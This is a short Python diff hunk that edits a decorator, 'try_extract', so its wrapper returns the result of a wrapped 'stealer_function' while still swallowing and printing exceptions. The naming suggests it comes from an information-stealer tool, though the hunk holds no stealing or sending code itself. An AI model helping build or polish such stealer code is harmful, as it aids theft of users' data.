@@ -31,7 +31,7 @@ def try_extract(stealer_function):
     def wrapper(*args, **kwargs):
         try:
             # Try calling stealer_function
-            stealer_function(*args, **kwargs)
+            return stealer_function(*args, **kwargs)
         except Exception as e:
             # Ignore any Exceptions
             print(e)
